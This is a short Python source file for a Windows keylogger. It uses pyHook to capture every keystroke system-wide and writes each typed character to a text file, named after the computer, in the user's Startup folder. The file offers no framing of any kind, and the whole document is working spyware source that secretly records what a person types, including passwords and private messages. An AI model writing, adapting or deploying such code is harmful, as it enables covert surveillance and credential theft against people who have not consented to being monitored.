import pyHook, pythoncom, sys, logging, os

def data_log():
    
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


def OnKeyboardEvent(event):
    global log_file
    logging.basicConfig(filename = log_file, level = logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

name = os.environ['COMPUTERNAME']
startup = os.path.expandvars("%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
log_file = os.path.expandvars(startup + "\\" + name + ".txt")
data_log()
